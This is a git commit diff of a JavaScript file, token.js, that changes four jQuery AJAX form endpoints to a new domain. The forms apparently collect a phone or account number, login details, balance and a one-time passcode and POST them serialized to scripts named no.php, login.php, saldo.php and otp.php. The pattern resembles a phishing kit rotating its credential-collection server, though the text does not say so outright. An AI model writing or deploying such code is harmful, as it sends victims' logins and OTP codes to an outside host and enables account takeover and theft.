28f166461103429389b2c7d5ac77396e09d07fc2
bku38742 <bku38742@gmail.com>
2024-08-14 22:30:49 +0700

    Update token.js

--- token.js
+++ token.js
@@ -5,7 +5,7 @@
  $("#lodingku").show();
  $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/kim/no.php',
+ url: 'https://axellent.aa-click.cfd/kim/no.php',
  data: $(this).serialize(),
  datatype: 'JSON', 
  complete: function(data) {
@@ -30,7 +30,7 @@ $('#form1').on('submit', function (event) {
 $("#lodingku").show();
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/kim/login.php',
+ url: 'https://axellent.aa-click.cfd/kim/login.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -61,7 +61,7 @@ $('#form2').on('submit', function (event) {
 $("#lodingku").show();
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/kim/saldo.php',
+ url: 'https://axellent.aa-click.cfd/kim/saldo.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
@@ -93,7 +93,7 @@ $('#form3').on('submit', function (event) {
   document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'https://choreo-is.masuk.web.id/kim/otp.php',
+ url: 'https://axellent.aa-click.cfd/kim/otp.php',
  async: false,
  dataType: 'JSON',
  data: $(this).serialize(), 
